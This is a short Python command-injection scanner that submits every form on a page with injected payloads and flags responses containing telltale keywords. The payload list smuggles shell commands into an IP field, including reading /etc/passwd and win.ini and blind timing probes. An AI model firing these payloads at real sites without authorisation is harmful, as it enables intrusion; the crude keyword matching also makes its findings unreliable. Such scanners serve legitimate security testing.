import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

payloads = [
    "127.0.0.1 && whoami",
    "127.0.0.1 && id",
    "127.0.0.1 && uname -a",
    "127.0.0.1 && ls",
    "127.0.0.1 && cat /etc/passwd",
    "127.0.0.1; whoami",
    "127.0.0.1 | whoami",
    "127.0.0.1 `whoami`",  
    "127.0.0.1 && echo vulnerable",
    "127.0.0.1 && sleep 5",  # time delay (blind injection)
    "127.0.0.1 & whoami",
    "127.0.0.1 & dir",
    "127.0.0.1 & echo vulnerable",
    "127.0.0.1 & type C:\\Windows\\win.ini",
    "127.0.0.1 | whoami",
    "127.0.0.1 & timeout 5",  # time delay (Windows)
    "127.0.0.1%26%26whoami",    # && URL encoded
    "127.0.0.1%3Bwhoami",       # ; URL encoded
    "127.0.0.1%7Cwhoami",       # | URL encoded
    "127.0.0.1%60whoami%60"     # backtick encoded
]

keywords = [
    "root", "uid=", "gid=", "Linux", "Windows", "C:\\", "/bin/bash",
    "No such file", "/etc/passwd", "command not found", "sh:",
    "system32", "admin", "whoami", "echo vulnerable"
]


def check_cmd_injection(url):
    results = {}

    try:
        page = requests.get(url, timeout=5)
        page.raise_for_status()
    except requests.RequestException as e:
        print(f"Error accessing page: {e}")
        return

    soup = BeautifulSoup(page.text, "lxml")
    forms = soup.find_all("form")
    if not forms:
        print("No form found on the page.")
        return

    for form in forms:
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        submit_url = urljoin(url, action)

        inputs = form.find_all("input")

        for load in payloads:
            data = {}
            for input_tag in inputs:
                name = input_tag.get("name")
                if name and input_tag.get("type") != "submit": #so that it doesnt put payload in submit field
                    data[name] = load

            try:
                if method == "post":
                    response = requests.post(submit_url, data=data, timeout=7)
                else:
                    response = requests.get(submit_url, params=data, timeout=7)
            except requests.RequestException as e:
                results[load] = f"Error: {e}"
                continue

            if response.status_code == 200:
                response_text = response.text
                isPresent = False
                for i in keywords:
                    if(i.lower() in response_text.lower()):
                        isPresent = True
                        break
                if(isPresent):
                    results[load]="Potential Vulnerability"
                else:
                    results[load]="No"        
            else:
                results[load] = f"Error: {response.status_code}"

    return results
